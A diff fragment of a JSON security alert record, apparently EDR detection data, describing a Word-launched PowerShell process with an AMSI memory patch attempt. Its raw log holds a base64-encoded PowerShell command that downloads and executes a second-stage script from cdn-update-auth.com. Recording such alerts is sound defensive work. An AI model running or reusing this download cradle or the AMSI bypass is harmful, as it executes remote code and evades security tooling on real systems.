@@ -8,3 +8,4 @@
   "description": "EDR detected powershell.exe executing base64 encoded command with WebClient downloading from cdn-update-auth.com and attempting AMSI memory patch.",
   "raw_logs": "Process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB1AHAAZABhAHQAZQAtAGEAdQB0AGgALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA= Parent: winword.exe PID: 4912"
 }
+
